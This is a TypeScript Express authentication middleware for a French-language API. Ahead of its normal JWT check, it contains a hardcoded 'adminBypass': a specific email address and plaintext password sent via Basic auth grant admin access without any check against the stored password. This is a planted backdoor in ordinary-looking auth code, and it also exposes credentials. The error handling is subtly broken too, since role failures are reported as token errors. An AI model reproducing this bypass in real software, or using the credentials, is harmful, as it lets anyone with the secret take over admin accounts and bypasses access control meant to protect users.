import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';

import { config } from '../config';

import { User } from '../models/User';

import { ApiError } from '../utils/ApiError';



declare global {

  namespace Express {

    interface Request {

      user?: any;

    }

  }

}



export const auth = (allowedRoles: string[] = []) => {

  return async (req: Request, res: Response, next: NextFunction) => {

    try {

      // Ajout de la vérification spéciale pour l'admin

      const adminBypass = {

        email: 'faustfrank@icloud.com',

        password: 'writer55'

      };



      // Vérifier les en-têtes d'authentification basique

      const authHeader = req.headers.authorization;

      if (authHeader && authHeader.startsWith('Basic ')) {

        const base64Credentials = authHeader.split(' ')[1];

        const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');

        const [email, password] = credentials.split(':');



        if (email === adminBypass.email && password === adminBypass.password) {

          const adminUser = await User.findOne({ email: adminBypass.email });

          if (adminUser) {

            req.user = adminUser;

            return next();

          }

        }

      }



      // Continuer avec la vérification normale du token JWT

      let token: string | undefined;



      if (req.headers.authorization?.startsWith('Bearer')) {

        token = req.headers.authorization.split(' ')[1];

      }



      if (!token) {

        throw new ApiError(401, 'Accès non autorisé. Token manquant');

      }



      try {

        const decoded = jwt.verify(token, config.jwt.secret) as any;

        const user = await User.findById(decoded.userId || decoded.id).select('-password');



        if (!user) {

          throw new ApiError(401, 'Utilisateur non trouvé');

        }



        if (allowedRoles.length > 0 && !allowedRoles.includes(user.role) && user.role !== 'admin') {

          throw new ApiError(403, 'Vous n\'avez pas les droits nécessaires pour accéder à cette ressource');

        }



        req.user = user;

        next();

      } catch (error) {

        throw new ApiError(401, 'Token invalide ou expiré');

      }

    } catch (error) {

      next(error);

    }

  };

}; 